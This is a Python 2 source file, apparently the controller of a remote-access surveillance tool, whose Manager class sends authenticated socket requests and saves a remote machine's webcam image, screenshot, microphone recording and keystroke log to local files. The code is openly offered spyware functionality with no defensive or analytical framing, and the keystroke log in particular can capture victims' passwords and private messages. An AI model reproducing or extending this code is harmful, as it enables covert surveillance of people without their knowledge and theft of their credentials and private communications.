from socket import *
import json, os
import time, random
import camera, display, keyboard, audio
import base64
from pysocket import *

SAVEDIR = os.path.dirname(os.path.abspath(__file__)) + "/temp"

class Manager(object):
    __camera = None
    __display = None
    __keyboard = None
    __audio = None
    __port = None
    __key = None
    __pysocket = None
    __user = None
    
    def __init__(self, user):
        self.__camera = camera.Camera()
        self.__display = display.Display()
        self.__keyboard = keyboard.Keyboard()
        self.__audio = audio.Audio()
        self.__user = user
        self.__pysocket = Pysocket()

    def requestImagem(self, socketServer):
        data = json.dumps({'type': 3, 'code': 0 ,'status' : 'OK', 'username': self.__user.getUsername(),'password': self.__user.getPassword()})
        try:
            socketServer.sendall(data)
        except:
            print "ERRO REQUEST IMAGE"
            return None
        return self.responseImagem(socketServer)
    
    def responseImagem(self,socketServer):
        response = self.__pysocket.recvall(socketServer)
        try:
            image = json.loads(response)
        except:
            print "ERRO RESPONSE IMAGE"
            return None
        return self.dataToImage(image)
    
    def dataToImage(self, data):
        data = data['image']
        filename = "%s/%s.jpg" % (SAVEDIR, 'image')
        fh = open(filename, "wb")
        fh.write(data.decode('base64'))
        fh.close()
        return filename
    
    def requestDisplay(self, socketServer):
        data = json.dumps({'type': 5, 'code': 0 ,'status' : 'OK',  'username': self.__user.getUsername(),'password': self.__user.getPassword()})
        try:
            socketServer.sendall(data)
        except:
            print "ERRO REQUEST DISPLAY"
            return None
        return self.responseDisplay(socketServer)
    
    def responseDisplay(self,socketServer):
        response = self.__pysocket.recvall(socketServer)
        try:
            image = json.loads(str(response))
        except:
            print "ERRO RESPONSE DISPLAY"
            return None
        return self.dataToDisplay(image)
    
    def dataToDisplay(self, data):
        data = data['display']
        filename = "%s/%s.png" % (SAVEDIR, 'display')
        fh = open(filename, "wb")
        fh.write(data.decode('base64'))
        fh.close()
        return filename
                
        
        
    
    def requestAudio(self, socketServer, size = 1024):
        data = json.dumps({'type': 4, 'code': 0 ,'status' : 'OK','size': int(size) ,   'username': self.__user.getUsername(),'password': self.__user.getPassword()})
        try:
            socketServer.sendall(data)
        except:
            print "ERRO REQUEST AUDIO"
            return None
        return self.responseAudio(socketServer)
    
    def responseAudio(self, socketServer):
        try:
            response = self.__pysocket.recvall(socketServer)
        except:
            print "ERRO RESPONSE AUDIO"
            return None
        response = json.loads(str(response))
        return self.dataToAudio(response)
    
    def dataToAudio(self, response):
        data = response['audio']
        filename = "%s/%s.wav" % (SAVEDIR, 'audio')
        fh = open(filename, "wb")
        fh.write(data.decode('base64'))
        fh.close()
        return filename
    
    def requestKeyboard(self, socketServer, size = 10):
        data = json.dumps({'type': 6, 'code': 0 ,'status' : 'OK','size': size,  'username': self.__user.getUsername(),'password': self.__user.getPassword()})
        try:
            socketServer.sendall(data)
        except:
            print "ERRO REQUEST KEYBOARD"
            return None
        return self.responseKeyboard(socketServer)
    
    def responseKeyboard(self,socketServer):
        response = self.__pysocket.recvall(socketServer)
        try:
            response = json.loads(str(response))
        except:
            print "ERRO RESPONSE KEYBOARD"
            return None
        return self.dataToKeysboard(response)
        
    def dataToKeysboard(self, data):
        data = data['keyboard']
        data = self.cleanKeys(data)
        filename = "%s/%s.txt" % (SAVEDIR, 'keys')
        fh = open(filename, "a")
        fh.write(data)
        fh.close()
        return filename
    
    def cleanKeys(self, text):
        text = text.replace('space', ' ')
        return text